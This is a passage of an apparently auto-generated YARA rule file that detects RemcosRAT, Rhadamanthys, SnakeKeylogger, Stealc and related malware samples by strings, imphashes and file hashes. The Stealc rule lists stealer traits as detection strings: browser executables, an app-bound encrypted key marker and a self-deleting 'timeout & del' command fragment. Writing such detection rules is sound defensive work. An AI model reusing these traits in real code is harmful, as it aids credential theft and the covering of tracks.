      $s7 = "get_TotalGamesCompleted" fullword ascii /* score: '12.00'*/
      $s8 = "get_CompletionTimes" fullword ascii /* score: '12.00'*/
      $s9 = "get_GamesCompleted" fullword ascii /* score: '12.00'*/
      $s10 = "{0} - {1:mm\\:ss} - Score: {2}" fullword wide /* score: '12.00'*/
      $s11 = "Game Started - {0} Difficulty" fullword wide /* score: '12.00'*/
      $s12 = "Grid is valid - {0} cells remaining" fullword wide /* score: '12.00'*/
      $s13 = "tempScore" fullword ascii /* score: '11.00'*/
      $s14 = "SudokuStats_{0:yyyy-MM-dd}.csv" fullword wide /* score: '10.00'*/
      $s15 = "Error exporting statistics: " fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 21000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_48 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash2 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAACgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s3 = "AAAAAAAAAACwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s4 = "dD99P6Y/rz/hP+g/AAAAQAAAgAAAAAgwWTCOMP8wQzFPMZcyvzLGMt4yADM0MzwzRzNzM30ziDOZM9gz7jMFNDo0PjRENEg0TTRUNFo0YjRtNMg00DT8NAg1LDU2NVs1" ascii /* score: '17.00'*/
      $s5 = "AAEAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAEAAAC" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s9 = "AAAAAAABAAAAA" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s11 = "AAAAAEAAAA" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAE" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s14 = "Sfh1J1CJyDHJikoBi1QRBoXSdA6LSPyFyXQHixLomPr//4PoCOh01P//WMOLwFOLGIXSdATw/0L4hdt0FPD/S/h1DlBSicr/Q/joo////1pYiRBbw5CDxORqHI1UJARS" ascii /* score: '16.00'*/
      $s15 = "N4l+BDPA6wODyP/GBaQnVwAAX15bw41QA8HqAz0sCgAAU4oNSQBXAA+HLAIAAITJD7aCvAVXAI0cxUDgRgB1VotTBItCCLn4////Odp0F4NCDAEjSPyJSgiJUPx0KMYD" ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__49 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash3 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash4 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash5 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash6 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash7 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash8 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash9 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash10 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $x1 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $x2 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
      $s3 = "; head runtime.guintptr; tail runtime.guintptr }; sweepWaiters struct { lock runtime.mutex; head runtime.guintptr }; cycles uint" ascii /* score: '28.00'*/
      $s4 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '27.00'*/
      $s5 = "L*struct { lock runtime.mutex; head runtime.guintptr; tail runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s6 = "5*struct { lock runtime.mutex; head runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s7 = "type..hash.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; " ascii /* score: '23.00'*/
      $s8 = "type..hash.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struc" ascii /* score: '22.00'*/
      $s9 = "CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetCommandLineWGetProce" ascii /* score: '22.00'*/
      $s10 = "type..eq.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struct " ascii /* score: '22.00'*/
      $s11 = "e uint32; mode runtime.gcMode; userForced bool; totaltime int64; initialHeapLive uint64; assistQueue struct { lock runtime.mutex" ascii /* score: '21.00'*/
      $s12 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '18.00'*/
      $s13 = "t { runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked " ascii /* score: '18.00'*/
      $s14 = "{ runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked ui" ascii /* score: '18.00'*/
      $s15 = "ex; runtime.head runtime.guintptr }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; runtime.tSweepTerm i" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cb9e4229_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_50 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cb9e4229.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd4f3cae.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb9e4229b8283a6e61bcaf9516cf7b49e6bf415c5bbce9eece7f7b9f0b6e97d5"
      hash2 = "fd4f3cae85f47c07738745df4c1bd449805aaecc72bba20e6312d02e5486e5fc"
   strings:
      $s1 = "secrter" fullword ascii /* score: '8.00'*/
      $s2 = "baglanti" fullword ascii /* score: '8.00'*/
      $s3 = "sqlbaglantisi" fullword ascii /* score: '8.00'*/
      $s4 = "Select * From Tbl_Hastalar where HastaTc=@p1" fullword wide /* score: '8.00'*/
      $s5 = "Select * From Tbl_Branslar" fullword wide /* score: '8.00'*/
      $s6 = "Select * From Tbl_Doktorlar where DoktorTC=@p1" fullword wide /* score: '8.00'*/
      $s7 = "Select * From Tbl_Randevular where RandevuDoktor = '" fullword wide /* score: '8.00'*/
      $s8 = "Select * From Tbl_Doktorlar where DoktorTC=@p1 and DoktorSifre=@p2" fullword wide /* score: '8.00'*/
      $s9 = "Select * From Tbl_Doktorlar" fullword wide /* score: '8.00'*/
      $s10 = "Select * From Tbl_Duyurular" fullword wide /* score: '8.00'*/
      $s11 = "Select * From Tbl_Randevular where HastaTC=" fullword wide /* score: '8.00'*/
      $s12 = "Select * From Tbl_Randevular where RandevuBrans = '" fullword wide /* score: '8.00'*/
      $s13 = "Select * From Tbl_Hastalar where HastaTC=@p1 and HastaSifre=@p2" fullword wide /* score: '8.00'*/
      $s14 = "Select * From Tbl_Randevular" fullword wide /* score: '8.00'*/
      $s15 = "Select (DoktorAd + ' ' + DoktorSoyad) as 'Doktorlar' , DoktorBrans From Tbl_Doktorlar" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7ff80d32_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_51 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7ff80d32.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3a882b87.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_44b56974.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_544d7bd4.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_61815887.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ac1e20be.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7ff80d32942d56f7c816287478657d30b2ccbbd6cd904d86cf710ef07e3105bf"
      hash2 = "3a882b870fce4e6cc303d89551e6b36741aedf2a97dc8a20163e964a0808f22b"
      hash3 = "44b569741123469cd19a343c8b33de6e24d77b26763d4692e070aa2b10a3a960"
      hash4 = "544d7bd464f262cdfda14e6df09a8b4ba3210867c0955eebc4e86d757f861238"
      hash5 = "6181588754a45750b20eee8e9d3844f14d85b0869bb860134cc240ac6f6d90dd"
      hash6 = "ac1e20be199c6cfcb9ab3f26995b204262dc4db69063e8fbb09cbac8630cee21"
   strings:
      $s1 = "Unit Converter - Conversion History Report" fullword wide /* score: '20.00'*/
      $s2 = "Conversion History - Unit Converter" fullword wide /* score: '17.00'*/
      $s3 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s4 = "Unsupported file format. Use .csv or .txt" fullword wide /* score: '14.00'*/
      $s5 = "Settings - Unit Converter" fullword wide /* score: '14.00'*/
      $s6 = "ConversionHistory_{0:yyyyMMdd}.csv" fullword wide /* score: '13.00'*/
      $s7 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s8 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
      $s9 = "<GetMostUsedConversions>b__20_2" fullword ascii /* score: '12.00'*/
      $s10 = "<GetMostUsedConversions>b__20_0" fullword ascii /* score: '12.00'*/
      $s11 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s12 = "<GetMostUsedConversions>b__20_1" fullword ascii /* score: '12.00'*/
      $s13 = "Export Conversion History" fullword wide /* score: '12.00'*/
      $s14 = "ConvertTemperature" fullword ascii /* score: '11.00'*/
      $s15 = "Kilogram" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__52 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash3 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
   strings:
      $s1 = "~}|{zyxwvutsrqponmlkjihg" fullword ascii /* reversed goodware string 'ghijklmnopqrstuvwxyz{|}~' */ /* score: '14.00'*/
      $s2 = "~}|{zyxwvutsrqponmlkjihgfedcba" fullword ascii /* reversed goodware string 'abcdefghijklmnopqrstuvwxyz{|}~' */ /* score: '14.00'*/
      $s3 = "rrgixriee" fullword ascii /* score: '8.00'*/
      $s4 = "rgiygvee" fullword ascii /* score: '8.00'*/
      $s5 = "zioxzykxee" fullword ascii /* score: '8.00'*/
      $s6 = "rrgizyglee" fullword ascii /* score: '8.00'*/
      $s7 = "rikjiee" fullword ascii /* score: '8.00'*/
      $s8 = "rrgiyonzee" fullword ascii /* score: '8.00'*/
      $s9 = "xuzgxkvu" fullword ascii /* score: '8.00'*/
      $s10 = "rrgijzyee" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a_53 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
   strings:
      $s1 = "$System.Console.dll&System.IO.Pipelines" fullword ascii /* score: '25.00'*/
      $s2 = "@System.Security.Cryptography.dll2System.Text.Encodings.Web" fullword ascii /* score: '19.00'*/
      $s3 = ":System.Text.Encodings.Web.dll System.Text.Json" fullword ascii /* score: '19.00'*/
      $s4 = "System.Text.Encodings.Web.JavaScriptEncoder{" fullword ascii /* score: '16.00'*/
      $s5 = "System.IO.Pipelines.Tests, PublicKey=00240000048000009400000006020000002400005253413100040000010001004b86c4cb78549b34bab61a3b180" ascii /* score: '16.00'*/
      $s6 = "System.IO.Pipelines.Tests, PublicKey=00240000048000009400000006020000002400005253413100040000010001004b86c4cb78549b34bab61a3b180" ascii /* score: '16.00'*/
      $s7 = "zThrowInvalidOperationException_TypeDoesNotSupportPolymorphismlThrowInvalidOperationException_DerivedTypeNotSupportedxThrowInval" ascii /* score: '15.00'*/
      $s8 = "System.IO.Pipelines.PipeWriter" fullword ascii /* score: '13.00'*/
      $s9 = "System.IO.Pipelines.Pipe" fullword ascii /* score: '13.00'*/
      $s10 = "System.Text.Encodings.Web.HtmlEncoder" fullword ascii /* score: '13.00'*/
      $s11 = "get_NewLineHget_CanUseFastPathSerializationLogic4ConfigureForJsonSerializer(GetTypeInfoNoCaching@" fullword ascii /* score: '13.00'*/
      $s12 = "System.Text.Encodings.Web.UrlEncoder" fullword ascii /* score: '13.00'*/
      $s13 = "ble0get_IgnoreReadOnlyMember" fullword ascii /* score: '12.00'*/
      $s14 = "HTryGetPolymorphicTypeInfoForRootType@" fullword ascii /* score: '12.00'*/
      $s15 = "ThrowInvalidOperationException_PolymorphicTypeConfigurationDoesNotSpecifyDerivedTypes" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__54 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash4 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash5 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash6 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash7 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash8 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash9 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash10 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.(*mSpanStateBox).get" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.isSweepDone" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.pallocSum.end" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.strhashFallback" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.boundsError.Error" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.memhash32Fallback" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.(*stackScanState).getPtr" fullword ascii /* score: '13.00'*/
      $s9 = "errors.New" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.memhashFallback" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.pallocSum.max" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.memhash64Fallback" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.chanparkcommit" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.schedEnableUser" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.binarySearchTree" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_55 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash3 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType&TryGetMethodInvoker@" fullword ascii /* score: '18.00'*/
      $s2 = "GetEmptyIfEmpty" fullword ascii /* score: '16.00'*/
      $s3 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheckBMethodInvokerWithMethodInvokeInfo*InstanceMethodInvoker" fullword ascii /* score: '16.00'*/
      $s4 = "FReflectionDomainSetupImplementationDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s5 = "`ReflectionExecutionDomainCallbacksImplementation MethodInvokeInfo" fullword ascii /* score: '16.00'*/
      $s6 = "4TryGetNonGcStaticFieldData.TryGetGcStaticFieldData6TryGetThreadStaticFieldDataFGetThreadStaticGCDescForDynamicType@" fullword ascii /* score: '15.00'*/
      $s7 = "(ThrowTargetException@" fullword ascii /* score: '14.00'*/
      $s8 = "Object does not match target type" fullword wide /* score: '14.00'*/
      $s9 = "IsPrimitiveType GetMethodInvoker@" fullword ascii /* score: '13.00'*/
      $s10 = "<GetCustomMethodInvokerIfNeeded" fullword ascii /* score: '13.00'*/
      $s11 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments@get_RuntimeGenericTypeParameters2get_SyntheticConstructo" ascii /* score: '12.00'*/
      $s12 = "6get_IsArrayOfReferenceTypes@TryLookupGenericMethodDictionary@" fullword ascii /* score: '12.00'*/
      $s13 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments@get_RuntimeGenericTypeParameters2get_SyntheticConstructo" ascii /* score: '12.00'*/
      $s14 = "\"get_DefaultBinder" fullword ascii /* score: '12.00'*/
      $s15 = "<GetNonRandomizedHashCodeOrdinalIgnoreCase>g__GetNonRandomizedHashCodeOrdinalIgnoreCaseSlow|46_0(GetSystemArrayEEType" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__112f19f28f55f461c3d7ad7d3898dd7b_imphash__Stealc_signature__112f19f28f55f461c3d7ad7d3898dd7b_imphash__d0e_56 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash).exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_d0e31b51.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "900df9f41073a91a893f3d9ee81a9d18648e13238cb3ee176563bef0bbd699f8"
      hash2 = "d0e31b51c7d4acc0dc409886dc78bd8a416c475fe10adfe1521d200562380148"
   strings:
      $x1 = "C:\\Windows\\system32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s2 = "brave.exe" fullword wide /* score: '22.00'*/
      $s3 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s4 = "/c timeout /t 5 & del /f /q \"" fullword ascii /* score: '15.00'*/
      $s5 = "endptr == token_buffer.data() + token_buffer.size()" fullword wide /* score: '15.00'*/
      $s6 = "C:\\builder_v2\\stealc\\json.h" fullword wide /* score: '13.00'*/
      $s7 = "\"app_bound_encrypted_key\":\"" fullword ascii /* score: '12.00'*/
      $s8 = "n_chars < number_buffer.size() - 1" fullword wide /* score: '12.00'*/
      $s9 = "last - first >= std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s10 = "last - first >= kMaxExp + 2" fullword wide /* score: '12.00'*/
      $s11 = "last - first >= 2 + (-kMinExp - 1) + std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s12 = "last - first >= std::numeric_limits<FloatType>::max_digits10 + 6" fullword wide /* score: '12.00'*/
      $s13 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s14 = "C:\\ProgramData\\" fullword ascii /* score: '10.00'*/
      $s15 = "object key" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "112f19f28f55f461c3d7ad7d3898dd7b" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__55d8ae2d_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_57 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_55d8ae2d.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5868c11d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "55d8ae2d11aeb76c2214d735c46917541ac04febc6b2f8ac998d1173b838b5ce"
      hash2 = "5868c11dade3d2e362682b1c5922e58c2adf30297d4c35a9fbb446401510704e"
   strings:
      $s1 = "Overall: {0:F2}% ({1}) - GPA: {2:F2}" fullword wide /* score: '12.00'*/
      $s2 = "Overall: 0.00% (F) - GPA: 0.00" fullword wide /* score: '12.00'*/
      $s3 = "{0}: {1:F1}% ({2} items) - Weight: {3:P0}" fullword wide /* score: '12.00'*/
      $s4 = "Error exporting report: " fullword wide /* score: '10.00'*/
      $s5 = "GetAllGrades" fullword ascii /* score: '9.00'*/
      $s6 = "GetOverallLetterGrade" fullword ascii /* score: '9.00'*/
      $s7 = "GetGradeStatus" fullword ascii /* score: '9.00'*/
      $s8 = "GetGrade" fullword ascii /* score: '9.00'*/
      $s9 = "GetLetterGrade" fullword ascii /* score: '9.00'*/
      $s10 = "get_DateAssigned" fullword ascii /* score: '9.00'*/
      $s11 = "PercentageToLetterGrade" fullword ascii /* score: '9.00'*/
      $s12 = "get_AssignmentName" fullword ascii /* score: '9.00'*/
      $s13 = "PercentageToGPA" fullword ascii /* score: '9.00'*/
      $s14 = "GetOverallAverage" fullword ascii /* score: '9.00'*/
      $s15 = "GetWeightedPoints" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__58 {
   meta:
